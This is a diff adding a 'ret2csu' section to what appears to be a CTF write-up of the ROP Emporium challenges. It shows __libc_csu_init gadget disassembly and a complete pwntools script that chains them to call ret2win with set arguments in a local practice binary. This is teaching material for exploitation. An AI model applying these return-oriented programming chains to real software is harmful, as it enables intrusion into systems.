@@ -392,4 +392,88 @@ io.interactive()
 
 ## ret2csu
 
+this time most of the useful gadgets are gone completely
+but in every binary there is a function called __libc_csu_init which is a setup function
+which allows us to control most of the registers:
 
+```
+pwndbg> x/10i 0x40069a
+   0x40069a <__libc_csu_init+90>:       pop    rbx
+   0x40069b <__libc_csu_init+91>:       pop    rbp
+   0x40069c <__libc_csu_init+92>:       pop    r12
+   0x40069e <__libc_csu_init+94>:       pop    r13
+   0x4006a0 <__libc_csu_init+96>:       pop    r14
+   0x4006a2 <__libc_csu_init+98>:       pop    r15
+   0x4006a4 <__libc_csu_init+100>:      ret
+   0x4006a5:    nop
+```
+
+we first start from __libc_csu_init+90 to pop values into these registers
+and then use the same function but earlier (__libc_csu_init+64) to move the values we popped
+into the argument registers:
+
+```
+pwndbg> x/20i 0x400680
+   0x400680 <__libc_csu_init+64>:       mov    rdx,r15
+   0x400683 <__libc_csu_init+67>:       mov    rsi,r14
+   0x400686 <__libc_csu_init+70>:       mov    edi,r13d
+   0x400689 <__libc_csu_init+73>:       call   QWORD PTR [r12+rbx*8]
+   0x40068d <__libc_csu_init+77>:       add    rbx,0x1
+   0x400691 <__libc_csu_init+81>:       cmp    rbp,rbx
+   0x400694 <__libc_csu_init+84>:       jne    0x400680 <__libc_csu_init+64>
+   0x400696 <__libc_csu_init+86>:       add    rsp,0x8
+   0x40069a <__libc_csu_init+90>:       pop    rbx
+   0x40069b <__libc_csu_init+91>:       pop    rbp
+   0x40069c <__libc_csu_init+92>:       pop    r12
+   0x40069e <__libc_csu_init+94>:       pop    r13
+   0x4006a0 <__libc_csu_init+96>:       pop    r14
+   0x4006a2 <__libc_csu_init+98>:       pop    r15
+   0x4006a4 <__libc_csu_init+100>:      ret
+```
+
+and then we continue with the win condition which is to call `ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)`:
+
+```python
+from pwn import *
+
+context.update(arch='amd64', log_level='debug')
+
+elf = ELF('./ret2csu')
+rop = ROP(elf)
+io = process(elf.path)
+
+csugadget1 = 0x40069a 
+csugadget2 = 0x400680 
+
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret = rop.find_gadget(['ret'])[0]
+win = elf.symbols['ret2win'] 
+_init = next(elf.search(p64(elf.symbols['_init'])))
+
+payload = flat([
+    b'A' * 32,          # offset = 32
+    b'FAKE_RBP',        # fake rbp
+    csugadget1,         # 
+    0,                  # rbx
+    1,                  # rbp 
+    _init,              # r12
+    0,                  # r13 
+    0xcafebabecafebabe, # r14 (mov rsi, r14 -> 0xcafebabecafebabe)  
+    0xd00df00dd00df00d, # r15 (mov rdx, r15 -> 0xd00df00dd00df00d)
+    csugadget2,         # ----------------------------------
+    0,                  # add rsp, 8 
+    0,                  # rbx
+    0,                  # rbp  
+    0,                  # r12  
+    0,                  # r13  
+    0,                  # r14  
+    0,                  # r15  
+    pop_rdi,            # 
+    0xdeadbeefdeadbeef, # rdi -> 0xdeadbeefdeadbeef
+    win                 # ret2win(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)
+])
+
+io.recvuntil(b'>')
+io.sendline(payload)
+io.interactive()
+```
